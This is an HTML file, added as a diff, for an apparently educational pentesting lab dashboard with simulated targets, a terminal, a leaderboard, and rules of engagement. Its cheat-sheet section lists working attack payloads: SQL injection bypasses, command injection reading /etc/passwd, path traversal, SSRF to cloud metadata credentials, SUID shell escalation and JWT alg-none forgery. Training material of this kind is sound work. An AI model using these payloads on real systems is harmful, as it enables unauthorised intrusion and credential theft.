@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYBER_RANGE // Penetration Testing & Offensive Security Suite</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <!-- ==========================================================================
+       LOGIN VIEW
+       ========================================================================== -->
+  <section id="auth-view">
+    <canvas id="matrix-canvas"></canvas>
+
+    <div class="auth-card">
+      <div class="auth-header">
+        <div class="auth-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          RESTRICTED GATEWAY • DEFENSE LEVEL 4
+        </div>
+        <h1 class="auth-title">CYBER_<span>RANGE</span></h1>
+        <p class="auth-sub">Authorized Penetration Testing Laboratory</p>
+      </div>
+
+      <!-- Quick Demo Credentials Pill -->
+      <div class="demo-credentials-pill" id="quick-fill-btn" title="Click to auto-fill credentials">
+        <span><strong style="color:var(--emerald-primary)">Demo:</strong> Avinav Singhal / cyber123</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
+      </div>
+
+      <!-- Login Form -->
+      <form class="auth-form" id="login-form">
+        <div class="form-group">
+          <label class="form-label" for="login-username">Operative Identity</label>
+          <div class="input-wrapper">
+            <input type="text" id="login-username" class="cyber-input" placeholder="e.g. Avinav Singhal" required autocomplete="off">
+            <span class="input-icon">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            </span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="login-password">Clearance Key</label>
+          <div class="input-wrapper">
+            <input type="password" id="login-password" class="cyber-input" placeholder="cyber123" required>
+            <span class="input-icon">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            </span>
+          </div>
+        </div>
+
+        <div class="auth-error" id="login-error">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+          <span id="login-error-msg">Invalid Credentials</span>
+        </div>
+
+        <button type="submit" class="btn-login" id="login-submit-btn">
+          AUTHENTICATE SESSION
+        </button>
+      </form>
+    </div>
+  </section>
+
+  <!-- ==========================================================================
+       MAIN DASHBOARD
+       ========================================================================== -->
+  <main id="dashboard-view">
+    <!-- Streamlined Single Navbar -->
+    <header class="top-nav">
+      <div class="nav-left">
+        <div class="brand">
+          <span class="brand-radar"></span>
+          <span class="brand-name">CYBER<strong>RANGE</strong></span>
+        </div>
+
+        <nav class="nav-links">
+          <button class="nav-item active" onclick="App.switchTab('labs', this)">Targets</button>
+          <button class="nav-item" onclick="App.switchTab('terminal', this)">Console</button>
+          <button class="nav-item" onclick="App.switchTab('attributes', this)">Attributes</button>
+          <button class="nav-item" onclick="App.switchTab('leaderboard', this)">Leaderboard</button>
+          <button class="nav-item" onclick="App.switchTab('scope', this)">Scope & RoE</button>
+          <button class="nav-item" onclick="App.switchTab('cheatsheet', this)">Cheatsheet</button>
+        </nav>
+      </div>
+
+      <div class="nav-right">
+        <div class="stats-group">
+          <span class="stat-pill pts"><span id="header-points">1,500</span> PTS</span>
+          <span class="stat-pill flags"><span id="header-flags">0/8</span> PWNED</span>
+          <button class="vpn-badge" id="vpn-toggle-btn" onclick="App.toggleVPN()" title="Toggle Virtual Lab VPN">
+            <span class="vpn-dot"></span>
+            <span id="vpn-status-text">10.10.14.33</span>
+          </button>
+        </div>
+
+        <div class="user-chip">
+          <div class="user-avatar" id="user-avatar-initials">AS</div>
+          <div class="user-meta">
+            <span class="user-name" id="user-display-name">Avinav Singhal</span>
+            <span class="user-role">Lead Pentester</span>
+          </div>
+        </div>
+
+        <button class="icon-btn" id="sound-btn" onclick="App.toggleAudio()" title="Sound Effects">
+          <svg id="sound-icon-on" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>
+          <svg id="sound-icon-off" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none;"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><line x1="23" y1="9" x2="17" y2="15"></line><line x1="17" y1="9" x2="23" y2="15"></line></svg>
+        </button>
+
+        <button class="icon-btn" onclick="Auth.handleLogout()" title="Logout">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <div class="main-content">
+      <!-- TAB 1: TARGET LABS -->
+      <section id="pane-labs" class="tab-pane active">
+        <div class="section-header">
+          <div>
+            <h2 class="section-title">Authorized Target Machines</h2>
+            <p class="section-sub">Subnet <code>10.10.110.0/24</code> • Select a target to route traffic and launch exploitation.</p>
+          </div>
+
+          <div class="filter-pills">
+            <button class="filter-btn active" onclick="Labs.filter('all', this)">All (8)</button>
+            <button class="filter-btn" onclick="Labs.filter('web', this)">Web</button>
+            <button class="filter-btn" onclick="Labs.filter('cloud', this)">Cloud</button>
+            <button class="filter-btn" onclick="Labs.filter('system', this)">System</button>
+          </div>
+        </div>
+
+        <div class="machines-grid" id="machines-container"></div>
+      </section>
+
+      <!-- TAB 2: KALI ATTACK CONSOLE -->
+      <section id="pane-terminal" class="tab-pane">
+        <div class="terminal-frame">
+          <div class="terminal-header">
+            <div class="term-controls">
+              <span class="term-dot close"></span>
+              <span class="term-dot min"></span>
+              <span class="term-dot max"></span>
+            </div>
+            <div class="term-title">
+              avinav@pwnbox: ~ [Target: <span id="term-active-target-name" style="color:var(--emerald-light)">SQL Fortress</span> @ <span id="term-active-target-ip">10.10.110.11</span>]
+            </div>
+            <div style="font-family:var(--font-mono); font-size:0.68rem; color:var(--text-dim)">
+              BASH 5.2 • tun0: 10.10.14.33
+            </div>
+          </div>
+
+          <div class="term-chips-bar">
+            <span style="color:var(--text-dim); font-size:0.68rem; font-family:var(--font-mono);">Quick:</span>
+            <button class="term-chip" onclick="Terminal.runCommand('help')">help</button>
+            <button class="term-chip" onclick="Terminal.runCommand('attribs')">attribs</button>
+            <button class="term-chip" onclick="Terminal.runCommand('nmap')">nmap</button>
+            <button class="term-chip" onclick="Terminal.runCommand('gobuster')">gobuster</button>
+            <button class="term-chip" onclick="Terminal.runCommand('exploit')">exploit</button>
+            <button class="term-chip" onclick="Terminal.runCommand('cat flag.txt')">cat flag.txt</button>
+            <button class="term-chip" onclick="Terminal.runCommand('status')">status</button>
+            <button class="term-chip" onclick="Terminal.runCommand('clear')">clear</button>
+          </div>
+
+          <div class="terminal-screen" id="term-output">
+            <div class="term-line" style="color: var(--emerald-primary); font-family:var(--font-mono);">
+              [+] PwnBox Terminal v4.2 • Offensive Security Suite (tun0: 10.10.14.33)<br>
+              [+] Connected: Avinav Singhal (Lead Penetration Tester)<br>
+              [+] Ready. Type 'help' for command reference or 'attribs' for skill matrix.
+            </div>
+          </div>
+
+          <div class="terminal-input-bar">
+            <span class="term-prompt" id="term-prompt-label">avinav@pwnbox:~$</span>
+            <input type="text" id="term-input" class="terminal-prompt-input" placeholder="Type command (e.g. nmap, gobuster, exploit, submit FLAG{...})" autocomplete="off" spellcheck="false">
+          </div>
+        </div>
+      </section>
+
+      <!-- TAB 3: ATTRIBUTES & PROFILE -->
+      <section id="pane-attributes" class="tab-pane">
+        <div class="section-header">
+          <div>
+            <h2 class="section-title">Penetration Tester Profile & Attributes</h2>
+            <p class="section-sub">Offensive capabilities, technical certifications, skill attributes matrix, and authorization credentials.</p>
+          </div>
+        </div>
+
+        <div id="tester-profile-content"></div>
+      </section>
+
+      <!-- TAB 4: LEADERBOARD -->
+      <section id="pane-leaderboard" class="tab-pane">
+        <div class="section-header">
+          <div>
+            <h2 class="section-title">CTF Leaderboard & Hall of Fame</h2>
+            <p class="section-sub">Live synchronized rankings. Scores recalculate automatically with each flag captured.</p>
+          </div>
+        </div>
+
+        <div class="leaderboard-wrap">
+          <div class="podium-grid" id="podium-cards-container"></div>
+          <table class="leaderboard-table">
+            <thead>
+              <tr>
+                <th style="width: 70px;">Rank</th>
+                <th>Operative</th>
+                <th>Badge</th>
+                <th>Flags Solved</th>
+                <th>Status</th>
+                <th style="text-align: right;">Total Score</th>
+              </tr>
+            </thead>
+            <tbody id="leaderboard-body"></tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- TAB 5: SCOPE & ROE -->
+      <section id="pane-scope" class="tab-pane">
+        <div class="section-header">
+          <div>
+            <h2 class="section-title">Rules of Engagement & Scope</h2>
+            <p class="section-sub">Authorized technical assessment boundaries and ethical compliance rules.</p>
+          </div>
+          <button class="btn-launch" onclick="App.generateAuditCertificate()">
+            Print Verification Attestation
+          </button>
+        </div>
+
+        <div class="scope-grid">
+          <div class="scope-card">
+            <h3>Assessment Authorization Mandate</h3>
+            <p style="color:var(--text-muted); font-size:0.82rem; margin-bottom:1rem;">
+              Strictly authorized simulation for vulnerability research and penetration testing practical evaluation.
+            </p>
+
+            <ul class="scope-list">
+              <li>
+                <span class="scope-badge-yes">IN-SCOPE</span>
+                <span><strong>Target Subnet:</strong> <code>10.10.110.0/24</code> (Machines 10.10.110.11 to 10.10.110.88).</span>
+              </li>
+              <li>
+                <span class="scope-badge-yes">IN-SCOPE</span>
+                <span><strong>Allowed Protocols:</strong> HTTP/S (80, 443, 8080), SSH (22), MySQL (3306), simulated S3 APIs.</span>
+              </li>
+              <li>
+                <span class="scope-badge-yes">IN-SCOPE</span>
+                <span><strong>Permitted Vectors:</strong> SQLi, RCE, Stored XSS, JWT header manipulation, S3 misconfig, LFI, SSRF, Linux SUID binary privilege escalation.</span>
+              </li>
+              <li>
+                <span class="scope-badge-no">PROHIBITED</span>
+                <span><strong>Denial of Service (DoS):</strong> Bandwidth exhaustion, fork-bombs, or destructive attacks.</span>
+              </li>
+              <li>
+                <span class="scope-badge-no">PROHIBITED</span>
+                <span><strong>Out-of-Scope:</strong> Gateway hosts, university production networks, external systems.</span>
+              </li>
+            </ul>
+
+            <div class="legal-notice">
+              <strong>STATUTORY COMPLIANCE:</strong> Testing authorized solely within this laboratory sandbox under Section 43/66 IT Act 2000.
+            </div>
+          </div>
+
+          <div class="scope-card">
+            <h3>Engagement Metadata</h3>
+            <div style="display:flex; flex-direction:column; gap:0.65rem; font-family:var(--font-mono); font-size:0.75rem;">
+              <div style="display:flex; justify-content:space-between; border-bottom:1px solid var(--border-subtle); padding-bottom:0.35rem;">
+                <span style="color:var(--text-dim)">LEAD AUDITOR:</span>
+                <span style="color:#fff; font-weight:bold;">Avinav Singhal</span>
+              </div>
+              <div style="display:flex; justify-content:space-between; border-bottom:1px solid var(--border-subtle); padding-bottom:0.35rem;">
+                <span style="color:var(--text-dim)">VPN TUNNEL:</span>
+                <span style="color:var(--emerald-light)">10.10.14.33 (tun0)</span>
+              </div>
+              <div style="display:flex; justify-content:space-between; border-bottom:1px solid var(--border-subtle); padding-bottom:0.35rem;">
+                <span style="color:var(--text-dim)">METHODOLOGY:</span>
+                <span>OWASP Top 10 + PTES</span>
+              </div>
+              <div style="display:flex; justify-content:space-between; border-bottom:1px solid var(--border-subtle); padding-bottom:0.35rem;">
+                <span style="color:var(--text-dim)">TARGET SUITE:</span>
+                <span>8 Lab Machines</span>
+              </div>
+              <div style="display:flex; justify-content:space-between;">
+                <span style="color:var(--text-dim)">MAX POSSIBLE:</span>
+                <span style="color:var(--accent-amber); font-weight:bold;">4,450 PTS</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TAB 6: PENTEST CHEATSHEET -->
+      <section id="pane-cheatsheet" class="tab-pane">
+        <div class="section-header">
+          <div>
+            <h2 class="section-title">Offensive Operations Cheat Sheet</h2>
+            <p class="section-sub">Standard payloads and exploitation one-liners for quick reference in viva & practicals.</p>
+          </div>
+        </div>
+
+        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(320px, 1fr)); gap:1rem;">
+          <div class="scope-card">
+            <h3>SQL Injection (Auth Bypass)</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">' OR '1'='1' --
+' OR 1=1 #
+admin' --
+' UNION SELECT null, username, password FROM users --</pre>
+          </div>
+
+          <div class="scope-card">
+            <h3>Command Injection (RCE)</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">127.0.0.1; whoami
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 | ls -la
+`cat flag.txt`</pre>
+          </div>
+
+          <div class="scope-card">
+            <h3>LFI & Directory Traversal</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+/var/log/apache2/access.log</pre>
+          </div>
+
+          <div class="scope-card">
+            <h3>SSRF & Cloud Metadata</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://0.0.0.0:8000/</pre>
+          </div>
+
+          <div class="scope-card">
+            <h3>Linux SUID Binary Escalation</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">find / -perm -u=s -type f 2>/dev/null
+find . -exec /bin/sh -p \; -quit
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</pre>
+          </div>
+
+          <div class="scope-card">
+            <h3>JWT Alg None Signature Bypass</h3>
+            <pre style="background:#060911; padding:0.65rem; border-radius:4px; font-family:var(--font-mono); font-size:0.72rem; color:#6ee7b7; overflow-x:auto;">Header: {"alg": "none", "typ": "JWT"}
+Payload: {"sub": "admin", "role": "administrator"}
+Signature: (leave blank)</pre>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <!-- ==========================================================================
+       TARGET WORKBENCH MODAL
+       ========================================================================== -->
+  <div class="modal-overlay" id="lab-modal" onclick="if(event.target.id==='lab-modal') Labs.closeModal()">
+    <div class="lab-modal">
+      <div class="modal-header">
+        <div>
+          <h3 id="modal-machine-title" style="color:#fff; font-family:var(--font-mono); font-size:1.05rem;">SQL Fortress</h3>
+          <span id="modal-machine-ip" style="color:var(--emerald-light); font-family:var(--font-mono); font-size:0.72rem;">10.10.110.11</span>
+        </div>
+        <button class="icon-btn" onclick="Labs.closeModal()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </button>
+      </div>
+
+      <div class="modal-body">
+        <p id="modal-machine-desc" style="font-size:0.8rem; color:var(--text-muted);"></p>
+
+        <!-- Live Sandbox Browser View -->
+        <div class="target-browser-mock">
+          <div class="browser-url-bar">
+            <span style="display:flex; gap:4px;">
+              <span style="width:7px;height:7px;border-radius:50%;background:#ef4444"></span>
+              <span style="width:7px;height:7px;border-radius:50%;background:#f59e0b"></span>
+              <span style="width:7px;height:7px;border-radius:50%;background:#10b981"></span>
+            </span>
+            <span id="modal-browser-url">http://10.10.110.11/login.php</span>
+          </div>
+          <div class="browser-content" id="modal-interactive-workspace"></div>
+        </div>
+
+        <!-- Flag Submission -->
+        <div class="flag-submission-bar">
+          <input type="text" id="modal-flag-input" class="cyber-input" style="flex:1; padding-left:0.75rem;" placeholder="Submit captured flag FLAG{...}">
+          <button class="btn-launch" onclick="Labs.submitModalFlag()">
+            SUBMIT FLAG
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div id="toast-notification">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--emerald-primary)" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+    <div id="toast-message">Flag verified!</div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="js/api.js"></script>
+  <script src="js/auth.js"></script>
+  <script src="js/testerProfile.js"></script>
+  <script src="js/labs.js"></script>
+  <script src="js/terminal.js"></script>
+  <script src="js/leaderboard.js"></script>
+  <script src="js/app.js"></script>
+</body>
+</html>
